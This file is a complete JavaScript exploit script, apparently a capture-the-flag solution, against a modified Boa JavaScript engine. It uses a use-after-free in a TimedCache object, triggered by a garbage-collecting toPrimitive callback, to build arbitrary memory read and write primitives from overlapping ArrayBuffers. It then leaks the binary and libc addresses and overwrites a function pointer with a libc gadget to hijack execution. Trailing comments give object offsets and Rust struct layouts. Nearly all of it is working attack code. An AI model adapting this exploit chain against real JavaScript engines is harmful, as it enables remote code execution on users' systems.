function win() {
  function addrOf(obj) {
      s = console.debug(obj).split("Object @")[1].split("\n")[0];
      return BigInt(s);
  }

  function wait() {
    console.sysbreak();
  }

  function methods(obj) {
    s = console.debug(obj).split("Methods @")[1].split("\n")[0];
    return BigInt(s);
  }


  function debug(o) {
      console.log(console.debug(o))
  }

  BigInt.prototype.hex = function() {
    return '0x' + this.toString(16);
  };

  const t = new TimedCache()
  const foo = [0,0,0,0,0]

  const pwn = {
    [Symbol.toPrimitive]() {
        console.sleep(1)
        console.collectGarbage()
        return 0
    }
  };

  function arb_read(addr) {
    /* change array buffer */
    arr[0x28/ 0x8 + 0x1] = BigInt(addr);

    return arb[0];
  }

  function arb_write(addr, val) {
    /* change array buffer */
    arr[(0x28+0x8) / 0x8] = BigInt(addr);

    arb[0] = BigInt(val);
  }

  t.set("A", {a:{x:1},b:{x:1},c:{x:1}}, 1)

  console.log("*** Get UAF ***")
  let uaf = t.get("A", pwn);

  i = 42
  foo[0] = new ArrayBuffer(8*i)
  //overlaps with uaf. uaf = foo[0x28]
  foo[1] = new ArrayBuffer(8*i)
  let arr = new BigUint64Array(foo[1])

  console.log("Victim: ", console.debug(uaf));
  console.log("Evil: ", console.debug(foo[1]));

  console.log("*** Setup arb read / write primitives ***")

  // kind (ArrayBuffer)
  arr[0x28 / 0x8] = 0x2n;
  // vec stuff
  arr[(0x28+0x10) / 0x8] = 0x100n
  arr[(0x28+0x18) / 0x8] = 0x100n
  // array buffer addr
  arr[0x28/ 0x8 + 0x1] = addrOf(console);
  // len
  arr[(0x28+0x20) / 0x8] = 0x100n
  // methods
  arr[(0x28+0x60) / 0x8] = 0x1377000n;

  debug(uaf)
  let arb = new BigUint64Array(uaf);

  let addr = addrOf(foo[1]);
  let copy = [];
  /* copy data of a valid ArrayBuffer to prevent crashes during arb write */
  for (let i = 0x28 / 0x8; i < arr.length; i++) {
      copy.push(arb_read(addr));
      addr += 0x8n
  }
  for (let i = 0; i < copy.length; i++) {
      arr[0x28 / 0x8 + i] = copy[i];
  }

  let ordinary_get_prototype_of = arb_read(methods(console.debug));
  const binary = ordinary_get_prototype_of - 0x8675f0n - 0x12b000n;
  console.log("binary @ " + binary.hex());
  const mprotect = arb_read(binary +  0x120aaa0n)
  console.log("mprotect @ ", mprotect.hex());
  const libc = mprotect - 0x1189a0n;
  console.log("libc @ " + libc.hex());
  const gadget = libc + 0xe3b04n;
  console.log("gadget @ " + gadget.hex());

  /* cause argv array to be initialized with zeros so gadget works */
  let arrs = []
  for (let i = 0; i < 0x100; i++) {
    arrs.push(new ArrayBuffer(0x40))
  }

  let f = console.collectGarbage;
  arb_write(addrOf(f) + 0x10n, gadget);
  f.call(null, null, null);
}

win();

// arb read: overwrite arraybuffer data ptr

// map type offset = 0x88

// total size of object: 296

// I think If the cache expires during our callback, it misses the root call,
// if we return 0, it misses the unroot call
//

/*
pub struct ArrayBuffer {
    pub array_buffer_data: Option<Vec<u8>>,
    pub array_buffer_byte_length: usize,
    // type of array
    pub array_buffer_detach_key: JsValue,
}

/// Garbage collected `Object`.
#[derive(Trace, Finalize, Clone, Default)]
pub struct JsObject {
    inner: Gc<boa_gc::Cell<Object>>,
}

/// A mutable memory location with dynamically checked borrow rules
/// that can be used inside of a garbage-collected pointer.
///
/// This object is a `RefCell` that can be used inside of a `Gc<T>`.
pub struct GcCell<T: ?Sized + 'static> {
    flags: Cell<BorrowFlag>,
    cell: UnsafeCell<T>,
}

pub struct Object {
    /// The type of the object.
    pub data: ObjectData,
    /// The collection of properties contained in the object
    properties: PropertyMap,
    /// Instance prototype `__proto__`.
    prototype: JsPrototype,
    /// Whether it can have new properties added to it.
    extensible: bool,
    /// The `[[PrivateElements]]` internal slot.
    private_elements: FxHashMap<Sym, PrivateElement>,
}
*/
